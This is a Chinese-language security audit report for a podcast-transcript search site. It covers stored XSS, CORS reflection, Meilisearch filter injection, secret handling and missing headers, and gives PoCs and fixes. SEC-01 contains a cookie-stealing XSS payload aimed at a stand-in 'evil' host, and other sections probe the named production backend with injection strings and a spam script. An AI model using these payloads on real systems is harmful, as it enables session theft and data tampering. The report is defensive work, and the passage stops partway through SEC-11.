# 安全審查 Bug Report — 給開發者

**測試日期**：2026-04-29
**測試範圍**：SQL/Filter injection、XSS / HTML injection、auth、HTTP headers、資訊洩漏、CORS
**測試方式**：代碼審查 + production GET-only 探測（無寫入 DB）+ 前端 fetch 攔截 PoC
**Plan 檔案**：`qa-reports/qa-plan-20260429-安全測試.md`

## 嚴重度說明
- 🔴 **Critical**：可被遠端利用、影響資料完整性或機密
- 🟠 **High**：明確漏洞，需短期內修
- 🟡 **Medium**：潛在風險或防禦性修補
- 🟢 **Low**：建議但非必要

## 摘要

| 嚴重度 | 件數 | ID |
|---|---|---|
| 🔴 Critical | 2 | SEC-01, SEC-02 |
| 🟠 High | 4 | SEC-03, SEC-04, SEC-05, SEC-06 |
| 🟡 Medium | 5 | SEC-07, SEC-08, SEC-09, SEC-10, SEC-11 |
| 🟢 Low | 3 | SEC-12, SEC-13, SEC-14 |

---

## 漏洞清單

### SEC-01 [🔴 Critical] Stored XSS：highlighted_text 用 dangerouslySetInnerHTML 渲染、後端不 escape

**檔案**：
- `backend/app/api/search.py:208-218`（後端 _format_hit）
- `frontend/src/components/SearchResults.tsx:89, 113`（前端渲染）
- 攻擊鏈起點：`backend/app/api/corrections.py:34-63`（無 auth 的公開 POST `/api/corrections`）

**問題**：
後端把 Meilisearch 回傳的 `_formatted.text`（含 `<mark>` 高亮標籤）當作 `highlighted_text` 直接回傳，**完全不做 HTML escape**。前端 `SearchResults.tsx` 兩處用 `dangerouslySetInnerHTML={{ __html: hit.highlighted_text }}` 渲染。只要 segment 內容含 `<` `>` `"` `'`，瀏覽器就會解析成 HTML/JS。

目前資料庫內容是 Whisper 產出的純逐字稿，**碰巧**沒有 HTML 字元，但攻擊鏈是完整的：

1. 攻擊者打 `POST /api/corrections`（**無需任何 auth**），`suggested_text` 填 `<img src=x onerror="fetch('https://evil/?cookie='+document.cookie)">`，submitter_name 填正常名字
2. 等管理員批次批准（admin 介面顯示 diff，但長句中夾 `<img>` 容易被忽略）
3. 批准後，`approve_correction()`（corrections.py:212-213）把 `suggested_text` 寫進 `Segment.text`，然後 `index_episode_segments()` 把它推進 Meilisearch
4. 之後任何訪客搜到包含這段的關鍵字，瀏覽器就會執行該腳本
5. 訪客的搜尋紀錄、admin 進入 `/admin` 後 React state 裡的 secret（雖不在 cookie，但 admin 在同 tab 切到搜尋頁就會被偷）皆可外洩

**重現（完整鏈不能在 prod 跑，這裡是前端渲染端的 PoC）**：

我用 Playwright 攔截 `fetch('/api/search')`，回傳一個假 payload 模擬「資料庫已經有惡意 segment 被索引」的狀態。這個 PoC **不寫任何後端**，只證明前端 sink 完全可達：

```javascript
// 在 https://sear.newfolderla.com/ 的 console 跑：
const orig = window.fetch;
window.fetch = async (u, o) => {
  if (typeof u === 'string' && u.includes('/api/search')) {
    return new Response(JSON.stringify({
      query: 'test', total_episodes: 1, total_segment_matches: 1,
      page: 1, per_page: 20,
      episodes: [{
        episode_id: 1, episode_title: 'XSS PoC', show: '直播',
        published_at: null, is_title_only_match: false, hit_count: 1,
        hits: [{
          segment_id: 1, start_time: 0, end_time: 1, text: 'fake',
          highlighted_text: '<img src=x onerror="document.title=\'XSS\'" />',
          is_title_only: false,
        }],
      }],
    }), { status: 200, headers: {'Content-Type': 'application/json'} });
  }
  return orig(u, o);
};
// 在搜尋框輸入 test → 按搜尋 → document.title 變成 "XSS"
```

**實測結果**：
```
{
  "snippetHTML": "<p class=\"nrk-card__snippet\"><img src=\"x\" onerror=\"window.__xssFired=true;document.title='XSS'\"></p>",
  "xssFired": true,
  "title": "XSS"
}
```
（截圖：`qa-reports/screenshots/security-round2/sec-xss-poc.png`）

**影響**：
- 可竊取所有訪問首頁、做過該關鍵字搜尋的使用者的 session、cookie、localStorage
- 可竊取 admin 在 `/admin` 登入後 React state 中的 secret（存在 React 元件變數內，不在 cookie，但 admin 切換頁面時可被外洩）
- 可植入 keylogger、cryptominer、或 phishing UI
- 因為 search 結果會反覆出現該段，攻擊持續存在直到 admin 手動移除

**建議修法**（後端 + 前端雙層）：

**後端（首選防線）**：在 `backend/app/api/search.py:208-218` 的 `_format_hit` 把 highlighted 字串做 escape，但保留我們自己注入的 `<mark>`：

```python
import html

PRE_TAG = "<mark>"
POST_TAG = "</mark>"
PRE_PLACEHOLDER = "\x00MARK_OPEN\x00"
POST_PLACEHOLDER = "\x00MARK_CLOSE\x00"

def _safe_highlight(formatted_text: str) -> str:
    """Meilisearch returns text with our chosen pre/post tags inserted around
    matches. We need to escape any user content (which can contain < > & "
    via stored corrections or RSS-injected episode_title) but keep our marks."""
    # 1. Replace our marker tags with placeholders (so they survive escape)
    s = formatted_text.replace(PRE_TAG, PRE_PLACEHOLDER).replace(POST_TAG, POST_PLACEHOLDER)
    # 2. Escape everything else
    s = html.escape(s, quote=False)
    # 3. Restore our marker tags
    s = s.replace(PRE_PLACEHOLDER, PRE_TAG).replace(POST_PLACEHOLDER, POST_TAG)
    return s

def _format_hit(hit):
    raw = hit.get("_formatted", {}).get("text", hit["text"])
    highlighted = _safe_highlight(raw)
    if hit["id"] in neighbors_map:
        prev_t, next_t = neighbors_map[hit["id"]]
        parts = []
        if prev_t:
            parts.append(html.escape(_trim_tail(prev_t, NEIGHBOR_MAX_CHARS), quote=False))
        parts.append(highlighted)
        if next_t:
            parts.append(html.escape(_trim_head(next_t, NEIGHBOR_MAX_CHARS), quote=False))
        highlighted = " ".join(parts)
    # 注意 neighbor text 也要 escape，現在沒做
    ...
```

**前端（防禦縱深）**：把 `dangerouslySetInnerHTML` 換成自己 parse 的渲染。例如：

```tsx
// SearchResults.tsx
function HighlightedText({ html }: { html: string }) {
  // Split by literal <mark> ... </mark> pairs, render <mark> as React element,
  // and let React escape everything else.
  const parts = html.split(/(<mark>|<\/mark>)/);
  let inMark = false;
  return (
    <>
      {parts.map((p, i) => {
        if (p === '<mark>') { inMark = true; return null; }
        if (p === '</mark>') { inMark = false; return null; }
        return inMark ? <mark key={i}>{p}</mark> : <span key={i}>{p}</span>;
      })}
    </>
  );
}
```

**不要做的修法**：
- ❌ **不要只在前端 escape**：後端應該回傳安全的字串，前端只是 defense-in-depth。Meilisearch 索引內容也應該是已 escape 的。
- ❌ **不要用 DOMPurify 套到 dangerouslySetInnerHTML**：DOMPurify 會放行某些 HTML（依 config），不如直接不渲染 raw HTML。
- ❌ **不要單純把 corrections 加 sanitize（例如剝除 `<>` 後存）**：那會把校對者用 `<` 表達的合法符號（在中英混合句子中很罕見但存在）也吃掉，且管不到 RSS 來源。

**參考**：
- OWASP A03:2021 — Injection
- CWE-79 (Reflected/Stored XSS)
- React docs：`dangerouslySetInnerHTML` should NEVER receive untrusted HTML

---

### SEC-02 [🔴 Critical] CORS 反射任意 origin + Allow-Credentials

**檔案**：`backend/app/main.py:37-43`，`backend/app/core/config.py:36`

**問題**：
- `cors_origins: list[str] = ["*"]`（config.py 預設）
- `allow_credentials=True`（main.py:41）
- `allow_methods=["*"]`、`allow_headers=["*"]`

實測結果：

```
$ curl -sI -X OPTIONS \
    -H "Origin: https://evil.example.com" \
    -H "Access-Control-Request-Method: POST" \
    "https://backend-production-b729.up.railway.app/api/corrections"

access-control-allow-credentials: true
access-control-allow-methods: DELETE, GET, HEAD, OPTIONS, PATCH, POST, PUT
access-control-allow-origin: https://evil.example.com    ← 反射！
```

對於 simple GET：

```
$ curl -sI -H "Origin: https://evil.example.com" \
    "https://backend-production-b729.up.railway.app/api/stats"

access-control-allow-credentials: true
access-control-allow-origin: *
```

`*` + credentials 在現代瀏覽器會被拒，**但 preflight 反射 origin 不會被拒**。

**重現**：見上面 curl。任何網域可以發送 credentialed POST：

```javascript
// 從 evil.example.com
fetch('https://backend-production-b729.up.railway.app/api/corrections', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({segment_id: 1, suggested_text: 'spam', submitter_name: 'attacker'})
}).then(r => r.json()).then(console.log);
// → 成功提交，且 evil 可讀回 response
```

**影響**：
- 目前 admin 不用 cookie 而是把 secret 放 React state、再每次當 query param 傳，所以 CSRF 風險不直接落在 admin POST。但：
- **任何網站可以代訪客發送公開的 POST `/api/corrections`**（spam 校對）
- **任何網站可以讀取所有 GET API 的 response**（資料整體爬取無 rate limit）
- **如果未來把 admin auth 改成 cookie / Authorization header**（合理路徑），就立刻成為完整 CSRF
- 防禦縱深角度：擋一個是一個

**建議修法**：
在 `backend/app/core/config.py` 把 `cors_origins` 改成只允許自己網站：

```python
cors_origins: list[str] = [
    "https://sear.newfolderla.com",
    "http://localhost:3000",  # 開發用，prod env var 蓋掉
]
```

並在 Railway 環境變數設 `GUCHI_CORS_ORIGINS='["https://sear.newfolderla.com"]'`（pydantic-settings 預設用 JSON 解 list）。

**不要做的修法**：
- ❌ **不要保留 `*` 同時用 credentials=true**：browsers 會拒，但 preflight 仍反射 origin
- ❌ **不要動態 reflect Origin header**（這是現在的行為，因為 list 是 `*`）

**參考**：
- OWASP CORS misconfiguration
- CWE-942 (Permissive Cross-domain Policy)
- MDN: ["The value of Access-Control-Allow-Origin in a response should be the value of the Origin request header" 是反模式]

---

### SEC-03 [🟠 High] FastAPI 自動產生的 /docs、/redoc、/openapi.json 在 production 公開

**檔案**：`backend/app/main.py:30-35`

**問題**：FastAPI 預設啟用 `/docs`（Swagger UI）、`/redoc`、`/openapi.json`。沒在 production 關掉。

**重現**：
```bash
curl -sI https://backend-production-b729.up.railway.app/docs            # 200
curl -sI https://backend-production-b729.up.railway.app/redoc           # 200
curl -sI https://backend-production-b729.up.railway.app/openapi.json    # 200
```

`/openapi.json` 公開了所有 endpoint（包括 admin 用的 `/api/replace-text`、`/api/maintenance/{action}`、`/api/ingest`、`/api/reindex`、`/api/corrections/batch-approve` 及其 parameter schema）。

**影響**：
- 攻擊者可以零成本拿到完整 attack surface 列表
- 看到 `X-Ingest-Secret` header 名稱與 `secret` query param，知道 auth 機制
- 看到 `ReplaceTextRequest` 結構，加速 fuzzing
- 對一般訪客毫無用處（這是 admin/dev 工具）

**建議修法**：在 `main.py` 把 docs URL 設成 None（或加 env flag）：

```python
import os
ENV = os.getenv("GUCHI_ENV", "production")

app = FastAPI(
    title="新資料庫",
    description="全文檢索呱吉頻道的 Podcast 逐字稿",
    version="1.0.0",
    lifespan=lifespan,
    docs_url="/docs" if ENV == "development" else None,
    redoc_url="/redoc" if ENV == "development" else None,
    openapi_url="/openapi.json" if ENV == "development" else None,
)
```

或更直接：

```python
app = FastAPI(
    ...,
    docs_url=None,
    redoc_url=None,
    openapi_url=None,
)
```

**參考**：CWE-540 (Inclusion of Sensitive Information in Source Code)

---

### SEC-04 [🟠 High] Meilisearch filter 字串注入（show 參數未 escape）

**檔案**：`backend/app/api/search.py:57-59`

```python
filters = []
if show:
    filters.append(f'show = "{show}"')
```

**問題**：`show` query param 直接 f-string 拼進 Meilisearch filter 表達式，沒 escape `"`。攻擊者可以塞 `"` 跳出字串字面值、注入任意 filter 子句。

**重現**：

```bash
B="https://backend-production-b729.up.railway.app"

# 1. 揭露內部可篩選 attribute（錯誤訊息洩漏）
$ curl -s "$B/api/search?q=test&show=%22%20OR%201%3D1%20OR%20show%20%3D%20%22"
{"detail":"Search service unavailable: MeilisearchApiError. Error code:
 invalid_search_filter. Error message: Index `segments`: Attribute `1` is
 not filterable. Available filterable attributes are: `episode_id`, `show`,
 `speaker`. ..."}

# 2. 成功改寫 filter — 強制只出現 episode_id=1 的結果
$ curl -s "$B/api/search?q=the&show=X%22%20OR%20episode_id%20%3D%201%20OR%20show%20%3D%20%22Y" \
   | python3 -c "import json,sys; d=json.load(sys.stdin); print('episodes', d['total_episodes']); \
                  print('first_ep', d['episodes'][0]['episode_title'])"
episodes 1
first_ep 【呱吉】新資料夾(276)：任何事情都有可能
```

實際送進 Meilisearch 的 filter 是：`show = "X" OR episode_id = 1 OR show = "Y"` — 完全跳出原本的 show 過濾意圖。

**影響**：
- 目前可篩選 attribute 只有 `episode_id`、`show`、`speaker`，這些資料本來就公開可讀，**所以資料外洩風險低**
- 但是違反 least-surprise / least-privilege：filter 邏輯被 user-controlled 字串改寫
- 錯誤訊息洩漏內部 schema（filterable attributes、index name `segments`）
- 防禦縱深角度：之後 Meilisearch 升級或加 sortable / filterable attributes，可能升級為實質風險
- 若未來把校對紀錄、private notes 等放進同一個索引並設不同 filter，這個 bug 立刻成為資訊外洩

**建議修法**：

最簡單：用 Meilisearch python client 的 array-form filter（已支援 list of clauses）：

```python
filters = None
if show:
    # array filter 不需要自己 escape
    filters = [f'show = "{show.replace(chr(92), chr(92)+chr(92)).replace(chr(34), chr(92)+chr(34))}"']
# 或更乾淨：
if show:
    filters = [["show", "=", show]]   # 確認 client 是否支援這語法
```

更穩妥：白名單。`show` 只能是 `settings.show_keywords.keys()` ∪ {`settings.default_show`} 內的值：

```python
ALLOWED_SHOWS = set(settings.show_keywords.keys()) | {settings.default_show}

@router.get("/search")
async def search(
    q: str = Query(..., min_length=1),
    show: str | None = Query(None),
    ...
):
    if show and show not in ALLOWED_SHOWS:
        raise HTTPException(status_code=400, detail="Invalid show name")
    filters = []
    if show:
        filters.append(f'show = "{show}"')
    ...
```

白名單版本最推薦，因為 `show` 的合法值是有限集合。

**不要做的修法**：
- ❌ 不要只 `replace('"', '')`：`\` 也能跳脫，且未來 Meilisearch 語法變動會讓這破功
- ❌ 不要用 regex「過濾危險字元」黑名單

**參考**：CWE-89 (Injection)（雖然不是 SQL，但 query language injection 同類）

---

### SEC-05 [🟠 High] Admin secret 走 URL query param（會進 server log / browser history / referer）

**檔案**：
- `backend/app/api/corrections.py:16-21`（verify-secret 接 query param）
- `backend/app/api/corrections.py:153-155, 192-196, 229-233`（approve/reject/batch-approve 都接 `secret` query param）
- `frontend/src/lib/api.ts:219-227, 229-240, 242-252`（前端把 secret 塞進 URLSearchParams）

**問題**：管理員 secret 透過 URL query string 傳輸。雖然走 HTTPS（傳輸層加密 OK），但 secret 會落在：
1. **Railway / Fastly access log**（這套架構有 CDN 與 backend，兩層 log）
2. **瀏覽器歷史紀錄、書籤**
3. **如果 admin 登入後切換到外部網站**：Referer header 會帶完整 URL（包含 secret）
4. **任何 server-side 錯誤上報工具**（Sentry 之類常記錄 URL）— 雖然目前沒接，但 backend 的 logger 已經會記 request URL

**重現**：
```bash
curl -sI "https://backend-production-b729.up.railway.app/api/corrections/verify-secret?secret=wrongsecret123"
# 200 / 403，URL 全部出現在 access log
```

打開 Chrome DevTools → Network → 看任何 admin 操作的 request URL，secret 就在那裡。

**影響**：
- Ingest secret 同時也是 admin secret（HANDOFF.md 第 60 行確認）。一旦外洩，攻擊者可以：
  - 透過 `/api/replace-text` **大規模污染整個 podcast 資料庫**
  - 觸發 `/api/maintenance/{action}` 跑各種破壞性指令
  - 批次批准任何校對建議（包含本攻擊者自己投的 stored XSS payload — 見 SEC-01）

**建議修法**：
1. **改用 `Authorization` header 或自訂 header**：不要走 URL：

```python
# corrections.py
@router.get("/verify-secret")
async def verify_secret(authorization: str = Header(None)):
    if not authorization or not authorization.startswith("Bearer "):
        raise HTTPException(status_code=403, detail="Invalid secret")
    secret = authorization[len("Bearer "):]
    if not settings.ingest_secret or not secrets.compare_digest(secret, settings.ingest_secret):
        raise HTTPException(status_code=403, detail="Invalid secret")
    return {"status": "ok"}
```

對應前端：

```typescript
// api.ts
export async function verifySecret(secret: string): Promise<boolean> {
  try {
    const res = await fetchWithRetry(`${API_BASE}/api/corrections/verify-secret`, {
      headers: { Authorization: `Bearer ${secret}` },
    });
    return res.ok;
  } catch {
    return false;
  }
}
```

2. **同步處理 batchApprove / reviewCorrection**：把 `secret` 從 URL 移到 header。

3. **如要更防禦**：admin 登入時用 secret 換取一個 short-lived JWT，後續用 JWT 而非 raw secret（但這對個人專案來說可能 over-engineering）。

**不要做的修法**：
- ❌ 不要把 secret 放在 path：`/api/corrections/{secret}/verify` —— 一樣會進 log
- ❌ 不要用 cookie 但不設 SameSite=Strict + Secure + HttpOnly
- ❌ 不要 base64 encode secret 假裝隱藏 —— 完全沒幫助

**參考**：
- OWASP API Security Top 10 — API2:2023 Broken Authentication
- CWE-598 (Use of GET Request Method With Sensitive Query Strings)

---

### SEC-06 [🟠 High] Secret 比對用 `==`（timing attack）+ 全部 endpoint 適用

**檔案**：
- `backend/app/main.py:76, 102, 131, 154`
- `backend/app/api/corrections.py:19, 161, 201, 238`

**問題**：所有 secret 比對都是 `provided_secret != settings.ingest_secret`（Python `!=` 字串比對是「找到第一個不同字元就 short-circuit return」）。理論上可逐字元測時間差還原 secret。

**現實風險評估**：
- secret 是 32 字元 hex（128 bits 隨機），暴力破解不可行
- timing 信號要在公網 + Railway/Fastly 兩層 CDN 下測量，jitter ~150ms+，遠大於 Python 字串比對的奈秒級差異
- **實際被遠端攻擊者利用的可能性極低**

**但**：`secrets.compare_digest()` 是 Python 標準函式、零成本、防禦縱深最佳實踐。沒有理由不用。

**重現**：實測 Railway 上 5 trials，no-prefix vs 1-byte-different prefix（HANDOFF 已知 secret 是 `e905...`）：
```
trial=1 time=0.797466
trial=2 time=0.643196
trial=3 time=0.883669
...
```
jitter > timing signal，公網不可利用。但代碼層面仍應修。

**影響**：在 production 走公網的情況下，此 timing attack 不可實際利用。但：
- 程式碼審查報告會列為「未遵守 best practice」
- 內網攻擊者（同 Railway region 的鄰居容器、或本機 dev 環境）就可能利用

**建議修法**：
全面改用 `secrets.compare_digest()`：

```python
import secrets

def _check_secret(provided: str | None) -> bool:
    if not settings.ingest_secret or not provided:
        return False
    return secrets.compare_digest(provided, settings.ingest_secret)


# main.py 的所有 if x_ingest_secret != settings.ingest_secret: 改成：
if not _check_secret(x_ingest_secret):
    raise HTTPException(status_code=403, detail="Invalid secret")
```

`compare_digest` 對「等長的字串做 constant-time 比對」、對「不等長的字串永遠 return False 但花類似時間做 dummy 比對」。

**不要做的修法**：
- ❌ 不要自己手寫 constant-time 比對（容易寫錯）

**參考**：
- CWE-208 (Observable Timing Discrepancy)
- Python docs: [`secrets.compare_digest`](https://docs.python.org/3/library/secrets.html#secrets.compare_digest)

---

### SEC-07 [🟡 Medium] 缺所有 HTTP 安全 headers（HSTS / CSP / X-Frame-Options / etc）

**檔案**：
- `backend/app/main.py`（FastAPI middleware 缺）
- `frontend/next.config.ts`（沒設 `headers()`）

**問題**：實測 frontend 與 backend response headers，**完全沒有任何安全 header**：

```bash
$ curl -s -D - "https://sear.newfolderla.com/" -o /dev/null
HTTP/2 200
cache-control: s-maxage=31536000
content-type: text/html; charset=utf-8
server: railway-edge
x-powered-by: Next.js
...
（無 CSP、HSTS、X-Frame-Options、X-Content-Type-Options、Referrer-Policy、Permissions-Policy）
```

**影響**：
- **無 HSTS**：第一次以 `http://` 訪問 → 可被中間人降級為 HTTP（雖然 Railway 應該強制 redirect 到 HTTPS，但沒有 `Strict-Transport-Security: max-age=...` 告訴瀏覽器之後永遠用 HTTPS）
- **無 X-Frame-Options / `frame-ancestors`**：可被任意網站 iframe 嵌入做 clickjacking。例如把 `/admin` iframe 進來做 UI redress 騙 admin 操作
- **無 CSP**：搭配 SEC-01 的 stored XSS，沒有 CSP 的 fallback；CSP 是 stored XSS 的最後一道防線
- **無 X-Content-Type-Options: nosniff**：MIME-sniff 可能把 `.json` 當 HTML 渲染（雖然 FastAPI 都正確設 Content-Type，但 defense in depth）
- **無 Referrer-Policy**：搭配 SEC-05 的 secret-in-URL，admin 切換到外部網站時 secret 可能透過 Referer 洩漏
- **`x-powered-by: Next.js`**：版本資訊洩漏（雖然不嚴重，可移除）

**建議修法**：

**Frontend** — `frontend/next.config.ts`：

```typescript
import type { NextConfig } from "next";

const securityHeaders = [
  {
    key: 'Strict-Transport-Security',
    value: 'max-age=63072000; includeSubDomains; preload'
  },
  {
    key: 'X-Frame-Options',
    value: 'DENY'
  },
  {
    key: 'X-Content-Type-Options',
    value: 'nosniff'
  },
  {
    key: 'Referrer-Policy',
    value: 'strict-origin-when-cross-origin'
  },
  {
    key: 'Permissions-Policy',
    value: 'camera=(), microphone=(), geolocation=()'
  },
  // CSP 最後再放 — 需要先測試所有 inline script、Google Fonts、SoundOn audio 都允許
  {
    key: 'Content-Security-Policy',
    value: [
      "default-src 'self'",
      "script-src 'self' 'unsafe-inline'",  // Next.js inline script 需要；長期目標是用 nonce
      "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
      "font-src 'self' https://fonts.gstatic.com",
      "img-src 'self' data:",
      "media-src https://*.soundon.fm",
      "connect-src 'self' https://backend-production-b729.up.railway.app",
      "frame-ancestors 'none'",
      "base-uri 'self'",
      "form-action 'self'",
    ].join('; ')
  },
];

const nextConfig: NextConfig = {
  output: "standalone",
  poweredByHeader: false,  // remove x-powered-by: Next.js
  async headers() {
    return [
      {
        source: '/:path*',
        headers: securityHeaders,
      },
    ];
  },
};

export default nextConfig;
```

**Backend** — `backend/app/main.py` 加 middleware：

```python
from starlette.middleware.base import BaseHTTPMiddleware

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        response = await call_next(request)
        response.headers["Strict-Transport-Security"] = "max-age=63072000; includeSubDomains"
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["Referrer-Policy"] = "no-referrer"
        return response

app.add_middleware(SecurityHeadersMiddleware)
```

**不要做的修法**：
- ❌ 不要設 CSP 之前先確認所有第三方資源都白名單，不然網站會壞掉
- ❌ 不要設 `frame-ancestors *` 或 `X-Frame-Options: ALLOW-FROM *` —— 等於沒設

**參考**：
- OWASP Secure Headers Project
- MDN [Strict-Transport-Security](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security)

---

### SEC-08 [🟡 Medium] Null byte 觸發 /api/text-count 500 Internal Server Error

**檔案**：`backend/app/api/search.py:263-275`

**問題**：null byte (`\x00`) 在 query string 中傳給 `/api/text-count?q=hi%00bye`，會把 null 字元送進 PostgreSQL 字串，**asyncpg 直接 raise**（PostgreSQL 字串不能含 null byte），FastAPI 沒接住變成 500：

**重現**：
```bash
$ curl -s -D - "https://backend-production-b729.up.railway.app/api/text-count?q=hi%00bye" -o /dev/null
HTTP/2 500
content-type: text/plain; charset=utf-8
content-length: 21    ← body is "Internal Server Error", 不是 JSON
```

對比 `/api/search?q=hi%00null` 不會掛（200，因為 Meilisearch 接受 null byte，沒走到 DB query）：
```
$ curl -s "$B/api/search?q=hi%00null" | head -c 200
{"query":"hi null","total_episodes":38, ...}
```

**影響**：
- 攻擊者可以對任何 SQL 走的 endpoint 用 null byte 觸發 500
- 不是資料外洩，但是 cheap DoS / availability 問題
- 揭露「這個 endpoint 某段路徑會打 DB」的內部資訊（vs 走 Meilisearch 的）
- 沒有 JSON 錯誤格式，前端 `parseJSON` 會炸出 unhelpful 錯誤

**建議修法**：在 `/api/text-count` 加 input validation：

```python
@router.get("/text-count")
async def text_count(
    q: str = Query(..., min_length=1, max_length=200),
    db: AsyncSession = Depends(get_db),
):
    # PostgreSQL TEXT 不能含 null byte
    if "\x00" in q:
        raise HTTPException(status_code=400, detail="Invalid characters in query")
    ...
```

更穩的做法：用 Pydantic validator 套到所有有 `q` 的 endpoint：

```python
from pydantic import AfterValidator
from typing import Annotated

def _no_null_byte(s: str) -> str:
    if "\x00" in s:
        raise ValueError("Null byte not allowed")
    return s

SearchQuery = Annotated[str, AfterValidator(_no_null_byte)]

@router.get("/search")
async def search(q: SearchQuery = Query(..., min_length=1), ...):
    ...
```

**參考**：CWE-158 (Improper Neutralization of Null Byte)

---

### SEC-09 [🟡 Medium] 公開 POST /api/corrections 無 rate limit、無 CAPTCHA、submitter_name 缺長度限制

**檔案**：
- `backend/app/api/corrections.py:34-63`
- `backend/app/models/episode.py:77`（DB column `String(100)`）
- `frontend/src/app/episode/[id]/page.tsx:167-173`（input 沒 maxLength）

**問題**：
1. `POST /api/corrections` 無任何 auth、無 rate limit、無 CAPTCHA — 任何人可發垃圾校對
2. `suggested_text: str` Pydantic 沒設 max_length
3. `submitter_name: str = "匿名"` Pydantic 沒設 max_length，但 DB 欄位是 `String(100)` → 送 >100 字會 500
4. 雖有「同 segment 同時只能有 1 筆 pending」的去重（corrections.py:45-52）但攻擊者跨不同 segment 可批量送

**重現** — 不在 prod 跑，但 spam scenario：
```python
# 攻擊者：~2.5M segments × 1 spam each = 2.5M pending corrections
for segment_id in range(1, 2_500_000):
    requests.post(f"{B}/api/corrections", json={
        "segment_id": segment_id,
        "suggested_text": "spam " * 1000,  # 5KB each
        "submitter_name": "anon",
    })
# DB 會塞 ~12 GB spam，admin 介面變慢，正常校對被淹沒
```

submitter_name 超長：
```python
requests.post(f"{B}/api/corrections", json={
    "segment_id": 1,
    "suggested_text": "x",
    "submitter_name": "a" * 200,  # > String(100)
})
# → 500 internal server error, 一條 segment 的 correction 被吃掉
```

**影響**：
- DoS / spam DB
- admin 工作量爆炸
- submitter_name 過長 → 500 + 沒有友善錯誤回應給校對者

**建議修法**：

1. **Pydantic 加 max_length**：

```python
from pydantic import BaseModel, Field

class CorrectionSubmit(BaseModel):
    segment_id: int
    suggested_text: str = Field(min_length=1, max_length=2000)
    submitter_name: str = Field(default="匿名", max_length=50)
```

2. **加簡單 rate limit** — 使用 `slowapi`（FastAPI 友好）：

```python
# 安裝 slowapi
# requirements.txt 加：slowapi==0.1.9

from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter

@router.post("")
@limiter.limit("5/minute")  # 每 IP 一分鐘最多 5 筆
async def submit_correction(request: Request, body: CorrectionSubmit, ...):
    ...
```

> ⚠️ 用 slowapi 前，檢查它的維護狀態（最後 commit 日期、issues），找替代品做橫向比較 —— 這是 user 的全域規則。或者用 `fastapi-limiter`（Redis backed）。但 Railway 沒有 Redis service 的話會增加成本。
> 簡單版：可以在記憶體用 dict + timestamp 自己刻一個 IP 限速器，足夠擋掉腳本兒童。

3. **frontend 加 maxLength**：
```tsx
// episode/[id]/page.tsx:167-173
<input
  id="submitter-name"
  type="text"
  value={submitterName}
  onChange={(e) => setSubmitterName(e.target.value)}
  placeholder="匿名"
  maxLength={50}
/>
```

**不要做的修法**：
- ❌ 不要鎖 IP — 攻擊者用 proxy 即可繞過，但會誤殺 NAT 後同 IP 多人

**參考**：CWE-770 (Allocation of Resources Without Limits or Throttling)

---

### SEC-10 [🟡 Medium] RSS 抓進來的 episode_title / description 未 sanitize（潛在 stored XSS 來源）

**檔案**：
- `backend/app/services/rss_parser.py:62-65`
- `backend/app/scripts/ingest.py:53`（直接 `Episode(**ep_data)`）
- `backend/app/services/indexer.py:22`（episode_title 進 Meilisearch、進 search index）
- 前端 `frontend/src/components/SearchResults.tsx:85` `<h3>{episode.episode_title}</h3>`（React escape 安全）
- 前端 `frontend/src/app/episode/[id]/page.tsx:143-144`（同樣 React escape）

**問題**：
RSS 是外部 input。SoundOn 是合法來源，但：
1. SoundOn 會把 description 包成 `<a href="https://...">SoundOn</a>` 的 raw HTML 字串塞給訪客（前端用 React 渲染，所以變成顯示「`<a href="..."`」字面 — 安全但醜）
2. 假設未來 SoundOn 被 compromise、或 podcast 描述被 host 改成 `<script>...</script>` —— React `{description}` 會 escape，但：
3. **episode_title 進 Meilisearch index → 走 highlighted_text 路徑（搭配 SEC-01 的 dangerouslySetInnerHTML）**就有問題了：當查詢命中 title，後端 search.py 把 episode_title 透過 `_formatted` 機制夾進 highlighted —— 等等，再看一次代碼：

實際上 search.py 的 highlighted_text 只取 `_formatted.text`（不是 `_formatted.episode_title`），所以 title 內的 HTML 不會走進 dangerouslySetInnerHTML。**安全。但是非常脆弱**：如果之後 `attributesToHighlight` 加上 `episode_title`，立刻爆。

**影響**：
- 目前不可利用，但是強耦合 + 隱性假設
- 一旦 SEC-01 修了（後端統一 escape），這條也順便解
- 不修 SEC-01 + 之後改 attributesToHighlight 加 `episode_title` → stored XSS

**建議修法**：
跟 SEC-01 同一招——在後端 `_format_hit` 統一 escape highlighted text，無論來自 text 還是 episode_title，都安全。RSS 入口處不一定要動。

如果想做雙重保險，可在 `rss_parser.py` 把 title / description 做 `html.escape()` 後再存：

```python
import html

title = html.escape(entry.get("title", ""), quote=False)
description = html.escape(entry.get("summary", ""), quote=False)
```

但這會讓 description 顯示成「`&lt;a href=...&gt;...&lt;/a&gt;`」更醜——需要產品決策。

**參考**：CWE-79

---

### SEC-11 [🟡 Medium] /api/replace-text 的 subprocess 雖以 list 形式呼叫但 user input 進 argparse

**檔案**：
- `backend/app/main.py:109-119, 145-158`
- `backend/app/scripts/ingest.py:282-291`

**問題**：
`/api/replace-text` 把 `body.old_text, body.new_text` 透過 `subprocess.run(cmd, ..., shell=False)`（list-form）丟給 ingest.py。**Shell injection 沒問題**（list-form 不會被 shell 解析）。

但兩個 string 進 argparse `--replace-text OLD NEW`，然後跑：

```python
result = await session.execute(select(Segment).where(Segment.text.contains(old_text)))
for seg in segments:
    seg.text = seg.text.replace(old_text, new_text_val)
await session.commit()
```

`Segment.text.contains(old_text)` 用 ORM bind param —— 安全。`.replace()` 是 Python str method —— 安全。

**所以實際上 OK，但是**：
- `replace-text` 會直接把 user-controlled text 寫進 ~2.5M segments 的 text 欄位
- 沒有 dry-run 模式、沒有結果預覽、沒有 size cap、沒有 confirmation
- 配合 SEC-05（secret-in-URL 洩漏），一旦 secret 流出，攻擊者可以 `replace-text "" "<script>...</script>"` 把整個資料庫變成 XSS land
- 配合 SEC-01（前端 dangerouslySetInnerHTML）這就成了 game over

**這個漏洞單獨看是 Medium，與 SEC-01 + SEC-05 鏈起來看是 Critical 的「強化路徑」**。

**建議修法**（需要 staging 測，這裡只列方向）：
